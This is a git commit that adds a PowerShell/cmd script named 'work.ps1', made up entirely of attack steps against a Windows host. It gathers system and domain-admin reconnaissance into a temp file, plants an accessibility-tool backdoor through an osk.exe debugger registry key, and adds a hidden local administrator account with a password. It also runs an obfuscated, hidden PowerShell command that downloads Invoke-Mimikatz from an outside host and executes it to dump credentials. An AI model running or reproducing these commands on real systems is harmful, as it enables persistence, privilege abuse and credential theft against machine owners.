1bf387a89f6f95cdef3deca2d2e5db2249bc192e
Munch <ap@munch.ac>
2017-10-23 15:44:43 -0400

    Initial upload.
    Initial upload.

---
+++ work.ps1
@@ -0,0 +1,13 @@
+cmd.exe /c "whoami"
+cmd.exe /c "ping -n 1 8.8.8.8"
+cmd.exe /c "netstat -rn >> C:\Users\%username%\AppData\Temp\a.txt"
+cmd.exe /c "systeminfo >> C:\Users\%username%\AppData\Temp\a.txt"
+cmd.exe /c "net group "Domain Admins" /domain >> C:\Users\%username%\AppData\Temp\a.txt"
+cmd.exe /c "reg.exe add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\osk.exe" /v "Debugger" /t REG_SZ /d "cmd.exe" /f"
+cmd.exe /c "net user rickflair natureb0y /add"
+cmd.exe /c "net localgroup Administrators rickflair /add"
+cmd.exe /c "tracert -d systemlowcheck.com"
+cmd.exe /c "powershell -windowStyle Hidden -ExecutionPolicy Bypass -encodedCommand SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAcwA6AC8ALwByAGEAdwAuAGcAaQB0AGgAdQBiAHUAcwBlAHIAYwBvAG4AdABlAG4AdAAuAGMAbwBtAC8AYwBsAHkAbQBiADMAcgAvAFAAbwB3AGUAcgBTAGgAZQBsAGwALwBtAGEAcwB0AGUAcgAvAEkAbgB2AG8AawBlAC0ATQBpAG0AaQBrAGEAdAB6AC8ASQBuAHYAbwBrAGUALQBNAGkAbQBpAGsAYQB0AHoALgBwAHMAMQAnACkAOwAgAEkAbgB2AG8AawBlAC0ATQBpAG0AaQBrAGEAdAB6AA==""
+
+
+
